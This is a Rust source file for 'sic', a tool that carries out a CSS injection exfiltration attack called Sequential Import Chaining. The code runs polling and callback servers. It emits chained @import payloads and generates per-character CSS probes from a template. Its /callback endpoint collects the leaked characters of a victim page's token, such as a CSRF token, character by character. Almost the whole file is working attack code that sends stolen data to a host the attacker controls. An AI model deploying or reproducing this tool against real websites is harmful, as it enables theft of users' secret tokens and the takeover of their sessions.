extern crate clap;
extern crate futures;
extern crate hyper;
extern crate rand;
extern crate url;


use clap::{Arg, App};
use futures::Async;
use futures::future;
use futures::task::Task;
use hyper::{Body, Method, Request, Response, Server, StatusCode};
use hyper::rt::Future;
use hyper::service::service_fn;
use rand::prelude::*;
use std::borrow::Cow;
use std::collections::{HashMap, VecDeque};
use std::fs;
use std::net::SocketAddr;
use std::string::String;
use std::sync::Arc;
use std::sync::RwLock;
use std::sync::RwLockReadGuard;
use std::sync::RwLockWriteGuard;
use url::Url;

/// We need to return different futures depending on the route matched,
/// and we can do that with an enum, such as `futures::Either`, or with
/// trait objects.
///
/// A boxed Future (trait object) is used as it is easier to understand
/// and extend with more types. Advanced users could switch to `Either`.
type BoxFut = Box<Future<Item = Response<Body>, Error = hyper::Error> + Send>;

fn parse_query_params(req: &Request<Body>) -> HashMap<String, String> {
    let url = Url::parse("http://localhost").unwrap().join(&req.uri().to_string()).unwrap();
    let cow_params: Vec<(Cow<str>, Cow<str>)> = url.query_pairs().collect();
    let mut params = HashMap::new();

    cow_params.iter().for_each(|item| {
        params.insert(item.0.to_string(), item.1.to_string());
    });

    params
}

/// This is our service handler. It receives a Request, routes on its
/// path, and returns a Future of a Response.
fn service_handler(req: Request<Body>, state: StateMap) -> BoxFut {
    let mut response = Response::new(Body::empty());

    match (req.method(), req.uri().path()) {
        (&Method::GET, "/staging") => {
            let params = parse_query_params(&req);
            let len = match params.get("len").unwrap().parse::<u32>() {
                Ok(len) => len,
                Err(_) => {
                    *response.status_mut() = StatusCode::INTERNAL_SERVER_ERROR;
                    *response.body_mut() = Body::from("Missing <b>len</b> parameter on staging.".to_string());
                    return Box::new(future::ok(response));
                }
            };

            // generate a unique id here
            let mut rng = rand::thread_rng();
            let id: u32 = rng.gen();

            let host = &state.polling_host;

            let mut staging_payload = "".to_string();

            for i in 0 .. len {
                staging_payload += &format!("@import url({});\n", craft_polling_url(host, &id.to_string(), i).to_string());
            }

            *response.body_mut() = Body::from(staging_payload);
        }
        (&Method::GET, "/polling") => {
            let params = parse_query_params(&req);
            let id = params.get("id").unwrap();
            let len = params.get("len").unwrap().parse::<u32>().unwrap();

            let generated_future = GeneratedCssFuture {
                id: id.clone(),
                len,
                state
            };

            return Box::new(generated_future);
        }
        (&Method::GET, "/callback") => {
            let params = parse_query_params(&req);
            let id = params.get("id").unwrap();
            let token = params.get("token").unwrap();

            state.insert_or_update_token(id, token);

            let queue: RwLockReadGuard<VecDeque<Task>> = state.awaiting_jobs.read().unwrap();

            queue.iter().for_each(|task| {
                task.notify()
            });

            println!("[id: {}] - {}", id, token);

            *response.body_mut() = Body::from("Successfully added new token state");
        }

        // The 404 Not Found route...
        _ => {
            *response.status_mut() = StatusCode::NOT_FOUND;
        }
    };

    Box::new(future::ok(response))
}

struct GeneratedCssFuture {
    id: String,
    len: u32,
    state: StateMap
}

impl Future for GeneratedCssFuture {
    type Item = Response<Body>;
    type Error = hyper::Error;

    fn poll(&mut self) -> Result<Async<Self::Item>, Self::Error> {
        let current_token = match self.state.get_token(&self.id) {
            Some(token) => token.clone(),
            None => "".to_string()
        };

        if current_token.len() as u32 >= self.len {
            let mut response = Response::new(Body::empty());
            *response.body_mut() = Body::from(process_template(&self.state.template_line, &self.state.callback_host, &self.id, &self.state.charset, &current_token));
            return Ok(Async::Ready(response));
        }

        let mut queue: RwLockWriteGuard<VecDeque<Task>> = self.state.awaiting_jobs.write().unwrap();
        queue.push_back(futures::task::current());
        return Ok(Async::NotReady);
    }
}

#[derive(Clone)]
struct StateMap {
    inner: Arc<RwLock<HashMap<String, String>>>,
    awaiting_jobs: Arc<RwLock<VecDeque<Task>>>,
    polling_host: String,
    callback_host: String,
    template_line: String,
    charset: String
}

impl StateMap {
    fn new(polling_host: String, callback_host: String, template_line: String, charset: String) -> Self {
        StateMap {
            inner: Arc::new(RwLock::new(HashMap::new())),
            awaiting_jobs: Arc::new(RwLock::new(VecDeque::new())),
            polling_host,
            callback_host,
            template_line,
            charset
        }
    }

    fn get_token(&self, id: &String) -> Option<String> {
        self.inner.read().unwrap().get(id).map(|f| f.clone())
    }

    fn insert_or_update_token(&self, id: &String, value: &String) {
        self.inner.write().unwrap().insert(id.clone(), value.clone());
    }
}

fn main() {
    let matches = App::new("sic")
        .version("1.0")
        .author("By d0nut (https://twitter.com/d0nutptr)")
        .about("A tool to perform Sequential Import Chaining.")
        .arg(Arg::with_name("polling_host")
            .long("ph")
            .default_value("http://localhost:3000")
            .help("The address sic should use when calling polling endpoints. Must be different than the callback host.")
            .takes_value(true)
            .number_of_values(1))
        .arg(Arg::with_name("callback_host")
            .long("ch")
            .default_value("http://localhost:3001")
            .help("The address sic should use when calling callback endpoints. Must be different than the polling host.")
            .takes_value(true)
            .number_of_values(1))
        .arg(Arg::with_name("template")
            .short("t")
            .long("template")
            .help("Points to a local file containing the css exfiltration template. \n\
            For more information on building templates, refer to the README.md that came with this project.")
            .required(true)
            .takes_value(true)
            .number_of_values(1))
        .arg(Arg::with_name("charset")
            .short("c")
            .long("charset")
            .default_value("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
            .help("Defines the list of possible characters that can be used in this token.")
            .takes_value(true)
            .number_of_values(1))
        .arg(Arg::with_name("port")
            .short("p")
            .long("port")
            .help("Specifies the lower of two service instances that sic will spawn. For example, if 3000 is specified, sic will spawn on 3000 and 3001.")
            .required(false)
            .takes_value(true)
            .number_of_values(1)
            .default_value("3000"))
        .get_matches();

    let polling_host = matches.value_of("polling_host").unwrap().to_string();
    let callback_host = matches.value_of("callback_host").unwrap().to_string();
    let template_loc = matches.value_of("template").unwrap().to_string();
    let charset = matches.value_of("charset").unwrap().to_string();
    let port: u16 = matches.value_of("port").unwrap().parse::<u16>().unwrap();

    assert_ne!(polling_host, callback_host);

    let template_line = fs::read_to_string(template_loc).expect("Unable to read template file.");

    hyper::rt::run(future::lazy(move || {
        let state = StateMap::new(polling_host.clone(), callback_host.clone(), template_line, charset.clone());

        let polling_addr = SocketAddr::from(([0, 0, 0, 0], port));
        let polling_state_instance = state.clone();
        let polling_responder = Server::bind(&polling_addr)
            .serve(move || {
                let state = polling_state_instance.clone();

                service_fn( move |req: Request<Body>| {
                    service_handler(req, state.clone())
                })
            })
            .map_err(|e| eprintln!("polling responder server error: {}", e));

        let callback_addr = SocketAddr::from(([0, 0, 0, 0], port + 1));
        let callback_state_instance = state.clone();
        let callback_responder = Server::bind(&callback_addr)
            .serve(move || {
                let state = callback_state_instance.clone();

                service_fn(move |req: Request<Body>| {
                    service_handler(req, state.clone())
                })
            })
            .map_err(|e| eprintln!("callback responder server error: {}", e));

        hyper::rt::spawn(polling_responder);
        hyper::rt::spawn(callback_responder);

        Ok(())
    }));
}

fn process_template(template_str: &String, host: &String, id: &String, charset: &String, known_token: &String) -> String {
    let mut result = "".to_string();

    for chr in charset.chars() {
        let token_payload = format!("{}{}", known_token, &chr);
        let callback = craft_callback_url(host, id, &token_payload);
        result += &template_str
            .clone()
            .replace("{{:callback:}}", &callback.to_string())
            .replace("{{:token:}}", &escape_for_css(&token_payload));
    }

    result
}

fn craft_callback_url(host: &String, id: &String, token: &String) -> Url {
    let mut url = Url::parse(host).unwrap();
    url.set_path("callback");
    url.query_pairs_mut()
        .append_pair("token", token)
        .append_pair("id", id);

    url
}

fn craft_polling_url(host: &String, id: &String, len: u32) -> Url {
    let mut url = Url::parse(host).unwrap();
    url.set_path("polling");
    url.query_pairs_mut()
        .append_pair("len", &len.to_string())
        .append_pair("id", id);

    url
}

fn escape_for_css(unescaped_str: &String) -> String {
    unescaped_str.replace("\\", "\\\\")
        .replace("!", "\\!")
        .replace("\"", "\\\"")
        .replace("#", "\\#")
        .replace("$", "\\$")
        .replace("%", "\\%")
        .replace("&", "\\&")
        .replace("'", "\\'")
        .replace("(", "\\(")
        .replace(")", "\\)")
        .replace("*", "\\*")
        .replace("+", "\\+")
        .replace(",", "\\,")
        .replace("-", "\\-")
        .replace(".", "\\.")
        .replace("/", "\\/")
        .replace(":", "\\:")
        .replace(";", "\\;")
        .replace("<", "\\<")
        .replace("=", "\\=")
        .replace(">", "\\>")
        .replace("?", "\\?")
        .replace("@", "\\@")
        .replace("[", "\\[")
		.replace("]", "\\]")
		.replace("^", "\\^")
		.replace("`", "\\`")
		.replace("{", "\\{")
		.replace("|", "\\|")
		.replace("}", "\\}")
		.replace("~", "\\~")
}